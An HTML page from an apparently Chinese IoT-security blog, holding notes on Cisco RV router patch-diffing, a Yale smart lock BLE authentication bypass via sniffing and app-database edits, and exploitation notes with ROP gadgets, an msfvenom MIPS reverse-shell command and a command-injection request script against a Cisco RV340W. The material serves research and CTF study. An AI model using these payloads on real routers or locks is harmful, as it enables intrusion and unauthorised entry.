no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 Ok</span><br><span class="line">Server: httpd</span><br><span class="line">Date: Mon, 05 Oct 2020 10:31:16 GMT</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前提：通过认证后、手动将nvram设置的mfg_radio设为on</span></span><br></pre></td></tr></table></figure>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
<li>version track使用：<a href="https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/" target="_blank" rel="noopener">https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/</a></li>
<li>通过过滤器，找到函数后，就不用version track了（就是过滤器有用</li>
<li>gd中添加书签：ctrl+D</li>
<li>信息泄漏CVE-2020-3150：<a href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</a></li>
<li>Ghidra version tracking还是不够强大，bindiff更专业</li>
<li>有的更新并没有与cve相对应，而是程序员的主动修改，前者是因为产生漏洞而被动修改</li>
<li>有何区别：ghidra分析后再bindiff、ida分析后再bindiff、直接bindiff（分析后的肯定要好、设置lib库再分析后的肯定更好</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://quentinkaiser.be//exploitdev/2020/09/23/ghetto-patch-diffing-cisco/" target="_blank" rel="noopener">https://quentinkaiser.be//exploitdev/2020/09/23/ghetto-patch-diffing-cisco/</a></li>
<li><a href="https://quentinkaiser.be/exploitdev/2020/10/01/patch-diffing-cisco-rv110/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/10/01/patch-diffing-cisco-rv110/</a></li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/04/10/iot/耶鲁智能门锁的安全分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/10/iot/耶鲁智能门锁的安全分析/" class="post-title-link" itemprop="url">耶鲁智能门锁的安全分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-10 09:23:44" itemprop="dateCreated datePublished" datetime="2021-04-10T09:23:44+08:00">2021-04-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 15:10:50" itemprop="dateModified" datetime="2022-02-21T15:10:50+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[TOC]</p>
<h1 id="耶鲁智能门锁的安全分析"><a href="#耶鲁智能门锁的安全分析" class="headerlink" title="耶鲁智能门锁的安全分析"></a>耶鲁智能门锁的安全分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><ul>
<li>概要：修复app日志输出、app逆向分析、减法获取productinfo来认证绕过</li>
<li>设备简介<ul>
<li>门锁的可拆卸蓝牙模块+手机app=蓝牙开锁</li>
<li>使用前需要先在app中绑定门锁</li>
<li>门锁在手机的蓝牙通信范围内，app会自动向门锁发起BLE连接</li>
<li>门锁对手机进行身份认证</li>
</ul>
</li>
<li>日志分析<ul>
<li>Android Killer查看app日志，无任何输出</li>
<li>对APK进行逆向，找到输出日志的代码</li>
<li>ILog类中所有Log函数均为空，两法：修改代码并重打包、Hook函数直接打印参数</li>
<li>修复日志输出代码后，获取日志</li>
<li>根据日志进行代码回溯</li>
</ul>
</li>
<li><p>修改smali代码并重打包</p>
<ul>
<li>Android Killer反编译app</li>
<li>ILog.smali：右键插入代码</li>
<li>AndroidManifest：添加android:debuggable标签</li>
</ul>
</li>
<li><p>app端处理流程</p>
<ul>
<li>门锁在手机附近时，app自动向门锁发起连接，门锁响应</li>
<li>回调函数被调用，发出一个广播（包含收到的BLE消息内容）</li>
<li>广播接收器收到广播，将BLE消息内容取出，交由xxx处理，</li>
<li>最终封装为ACK帧，writeCharacteristic将其发送给门锁</li>
</ul>
</li>
<li><p>身份认证过程</p>
<ul>
<li>门锁在手机附近时，app自动向门锁发起连接</li>
<li>门锁向手机发送Authentication Request</li>
<li>Request处理后得到Payload，再封装成Authentication Response</li>
<li>手机将response发送到门锁，门锁进行认证</li>
<li>若手机通过认证，则可开关门锁</li>
</ul>
</li>
<li><p>Payload如何生成</p>
<ul>
<li>Request被分成若干字节，每个字节都与key1~key6中的某一个相加，结果放在c1r1~c3r4中，c1r1~c3r4重新拼接成字节流形式，即Payload</li>
<li>Payload：Request + key1~key6</li>
<li>Request：门锁发来的</li>
<li>key1~key6：productInfo变量</li>
<li>productInfo：门锁发来的，烧录在flash的固定密钥</li>
</ul>
</li>
<li><p>认证绕过</p>
<ul>
<li>门锁绑定不同手机时，发送的productInfo是相同的</li>
<li>身份认证的算法是加法运算，若嗅探到Request和Response，二者相减可得productInfo</li>
<li>request+productinfo，构造出response，认证绕过</li>
</ul>
</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><ul>
<li><p>概要：app代码分析、ble嗅探、未授权开锁</p>
</li>
<li><p>BLE通信过程</p>
<ul>
<li>Master-Scanner状态下，不断地扫描并接收Slave-Advertiser状态下发出的广播包</li>
<li>共40个信道，广播包固定在其中3个信道上进行</li>
<li>Master与Slave建立连接时会进入Initiator状态，并向Slave发起连接请求</li>
<li>建立连接后，在其他37个信道上，跳频通信</li>
</ul>
</li>
<li><p>嗅探工具Dongle</p>
<ul>
<li>插入pc-usb口，配套软件-Packet Sniffer</li>
<li>非全频谱嗅探工具：依靠CONNECT_REQ来跟踪连接后的跳频通信</li>
<li>一次只能监听一个广播信道：若只有一个则需多次尝试</li>
</ul>
</li>
<li><p>CONNECT_REQ</p>
<ul>
<li>建立连接前最后一个广播包</li>
<li>若探测到，说明有Master/Slave准备建立连接</li>
<li>Dongle通过它来跟踪跳频通信</li>
</ul>
</li>
<li><p>Dongle嗅探</p>
<ul>
<li>配置Dongle监听某个广播信道，点击开始嗅探，app内连接门锁</li>
<li>发现CONNECT_REQ，说明二者准备连接，建立连接后，开始跳频通信（Channel字段变化）</li>
<li>Dongle自动跟踪二者的通信过程，不再显示其他设备的广播内容</li>
</ul>
</li>
<li><p>数据包结构</p>
<ul>
<li>前2：event、source</li>
<li>3：数据包的序号</li>
<li>4：长度</li>
<li>5开始：数据包的Payload</li>
<li>后1：校验码</li>
</ul>
</li>
<li><p>获取productinfo</p>
<ul>
<li>提取出request和response中的payload，二者作差，得到productInfo计算值</li>
<li>adb从手机中取得Yale app的应用数据库，得到productInfo真实值</li>
<li>对比两个productinfo，只有前6字节参与计算</li>
</ul>
</li>
<li><p>修改数据库</p>
<ul>
<li>ADB拉取app数据库，修改完成后再推送回去</li>
<li>拉取app数据库前提：root权限，或者run-as指令</li>
<li>run-as指令需要app允许debug，故AndroidManifest.xml中添加Android:debuggable=true</li>
</ul>
</li>
<li>未授权解锁<ul>
<li>获取productinfo：ble嗅探，获取request/response中的payload，二者作差</li>
<li>拉取app数据库并修改：productinfo、module_addr（门锁地址，nRF Connect可得）</li>
<li>ADB推送数据库回手机，重启app，手机与门锁连接后，就可开锁</li>
</ul>
</li>
<li>其它<ul>
<li>本设备的BLE通信无加密，嗅探可直接获取通信内容</li>
<li>智能门锁种类繁多，开锁方式不只有BLE方式</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/gQlG" target="_blank" rel="noopener">https://www.4hou.com/posts/gQlG</a></li>
<li><a href="https://www.4hou.com/posts/o633" target="_blank" rel="noopener">https://www.4hou.com/posts/o633</a></li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/04/09/iot/iot设备漏洞利用相关/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/09/iot/iot设备漏洞利用相关/" class="post-title-link" itemprop="url">iot设备漏洞利用相关</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-09 14:41:33" itemprop="dateCreated datePublished" datetime="2021-04-09T14:41:33+08:00">2021-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:08:00" itemprop="dateModified" datetime="2022-02-21T16:08:00+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="iot漏洞利用相关"><a href="#iot漏洞利用相关" class="headerlink" title="iot漏洞利用相关"></a>iot漏洞利用相关</h1><h1 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h1><ul>
<li><p>静态分析</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 用sp定位LR：</span></span><br><span class="line">- STMFD   SP!, &#123;R4-R11,LR&#125;：LR = sp+4*8（LR在地址高处，其次11、10</span><br><span class="line">- SUB     SP, SP, <span class="comment">#0x2C：sp = sp-0x2c</span></span><br><span class="line">- 所以：LR= sp+0x2c+4*8</span><br><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">- dest = sp+0x18</span><br><span class="line">- LR= sp+0x2c+4*8</span><br><span class="line">- 偏移 = LR-dest = 0x2c+4*8 -0x18 = 0x34</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 基准：push/stmfd、sub后的sp</span></span><br><span class="line">STMFD SP!, &#123;R4-R11,LR&#125;</span><br><span class="line">SUB SP, SP, <span class="comment">#0x2C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LR位置</span></span><br><span class="line">loc = sp+2c+8*4</span><br><span class="line"></span><br><span class="line"><span class="comment"># dst_buff 位置</span></span><br><span class="line">loc = sp+0x50-0x38=sp+0x18</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">sp+0x2c+8*4 - sp+0x18 = 0x2c+8*4-0x18=0x34</span><br></pre></td></tr></table></figure>
</li>
<li><p>动态调试</p>
<h1 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h1></li>
<li><p>自身程序</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复现影响79款Netgear路由器高危漏洞：https://www.anquanke.com/post/id/235497</span></span><br><span class="line"></span><br><span class="line">mov R0,SP</span><br><span class="line">BL system</span><br></pre></td></tr></table></figure>
</li>
<li><p>libc</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1、强网杯2020决赛 ciscoRV110W web服务漏洞复现</span></span><br><span class="line">https://www.anquanke.com/post/id/224301<span class="comment">#h3-7</span></span><br><span class="line"></span><br><span class="line">|  0x000257A0  |  addiu <span class="variable">$a0</span>,<span class="variable">$sp</span>,0x58+var_40  |  jalr  <span class="variable">$s0</span>  |</span><br><span class="line">|  0x0003D050  |  move <span class="variable">$t9</span>,<span class="variable">$a0</span>  |  jalr  <span class="variable">$a0</span>  |</span><br><span class="line">只要将shellcode写到<span class="variable">$sp</span>+0x18处，将s0覆盖为0x0003D050，将返回地址覆盖为0x000257A0，就可以在第一个gadget处先将shellcode的地址放到a0寄存器，然后跳转到第二个gadget跳转到shellcode上</span><br></pre></td></tr></table></figure>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 强网杯2020决赛 ciscoRV110W web服务漏洞复现</span></span><br><span class="line">https://www.anquanke.com/post/id/224301<span class="comment">#h3-7</span></span><br><span class="line"></span><br><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.102 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h1 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送Content-Type: multipart/form-data的post请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 burp：boundary可以不唯一，只是一个分界符，但是header和body中要统一</span></span><br><span class="line">POST /xxx HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------4d8fe9222f5fb896</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">--------------------------4d8fe9222f5fb896</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"filename"</span></span><br><span class="line"></span><br><span class="line">config.xml</span><br><span class="line">--------------------------4d8fe9222f5fb896</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file.path"</span></span><br><span class="line"></span><br><span class="line">/tmp/</span><br><span class="line">--------------------------4d8fe9222f5fb896</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 python-request：Content-Type不能有，要自动生成</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'</span></span><br><span class="line">    <span class="comment">#'Content-Type': 'multipart/form-data; boundary=------------------------4d8fe9222f5fb896',</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;<span class="string">"filename"</span>: (None, <span class="string">"config.xml"</span>), <span class="string">"file.path"</span>: (None, <span class="string">"/tmp/"</span>)&#125;</span><br><span class="line">r = requests.post(url, headers=headers,files=params,verify=False)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 python-socket：发送原生的http数据</span></span><br><span class="line">    header = <span class="string">"POST /upload HTTP/1.1\r\nHost: 192.168.1.1\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36\r\nCookie: selected_language=English; sessionid='|%s|'; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV340W; fwver=1.0.03.18; current-page=Admin_License\r\nContent-Type: multipart/form-data; boundary=------------------------4d8fe9222f5fb896\r\nContent-Length: 452\r\n\r\n"</span> % cmd</span><br><span class="line">    body = <span class="string">"--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"destination\"\r\n\r\n1\r\n--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"file.path\"\r\n\r\n1\r\n--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"pathparam\"\r\n\r\nConfiguration\r\n--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"fileparam\"\r\n\r\n1\r\n--------------------------4d8fe9222f5fb896"</span></span><br><span class="line">    payload = header + body</span><br><span class="line">    sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    sock.send(payload)</span><br><span class="line">    resp = sock.recv(1024)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"response: %s"</span> % resp)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
